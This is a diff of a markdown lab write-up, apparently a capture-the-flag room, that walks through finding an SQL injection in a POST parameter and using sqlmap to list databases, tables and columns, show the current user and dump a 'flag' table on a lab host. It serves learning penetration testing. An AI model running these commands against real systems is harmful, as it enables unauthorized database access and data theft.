@@ -56,8 +56,8 @@ First, we need to identify the vulnerable POST request and save it. In order to 
 You’ll notice in the request above, we have a POST parameter 'blood_group' which could a vulnerable parameter.
 
 SavedHTTPPOST request
-```shell-session
-nare@nare$ cat req.txt     #request output saved as a file
+```BurpSuite
+nare@nare$ cat req.txt                        #request output saved as a file
 POST /blood/nl-search.php HTTP/1.1
 Host: 10.10.17.116
 Content-Length: 16
@@ -73,7 +73,7 @@ Accept-Language: en-US,en;q=0.9
 Cookie: PHPSESSID=bt0q6qk024tmac6m4jkbh8l1h4
 Connection: close
 
-blood_group=B%2B      #vuln param
+blood_group=B%2B                                        #vuln param
 ```
 
 Now that we’ve identified a potentially vulnerable parameter, let’s jump into the sqlmap and use the following command:  
@@ -163,14 +163,14 @@ Database: blood
 | users    |
 +----------+
 ```
-\
-Once we have available tables, now let’s gather the columns from the table `blood_db`.
 
-**Using GET based Method**
+Once we have available tables, now let’s gather the columns.
+
+**Getting Columns Using GET based Method**
 `sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> -T <table_name> --columns`  
 `sqlmap -u https://testsite.com/page.php?id=7 -D blood -T blood_db --columns`
 
-**Using POST based Method**
+**Getting Columns Using POST based Method**
 `sqlmap -r req.txt -D <database_name> -T <table_name> --columns`  
 `sqlmap -r req.txt -D blood -T blood_db --columns`
 
@@ -187,4 +187,46 @@ Or we can simply dump all the available databases and tables using the following
 
 # Challenge
 
+- Gobuster/dirb
+![](Pasted%20image%2020250105003751.png)
 
+![](Pasted%20image%2020250105003413.png)
+
+![](Pasted%20image%2020250105003455.png)
+
+![](Pasted%20image%2020250105003502.png)
+
+![](Pasted%20image%2020250105003541.png)
+
+![](Pasted%20image%2020250105003608.png)
+		![](Pasted%20image%2020250105003624.png)
+
+
+```
+sqlmap -r get_blood --dbs
+```
+![](Pasted%20image%2020250105003831.png)
+
+
+```
+sqlmap -r get_blood -D blood --tables
+```
+
+```
+sqlmap -r get_blood -D blood -T flag --columns
+```
+![](Pasted%20image%2020250105004556.png)
+
+
+- To see the current user, command is following:
+```
+sqlmap -r get_blood --current-user
+```
+![](Pasted%20image%2020250105004641.png)
+
+
+- Retrieving all info
+```
+sqlmap -r get_blood -D blood -T flag --dump
+```
+![](Pasted%20image%2020250105004749.png)
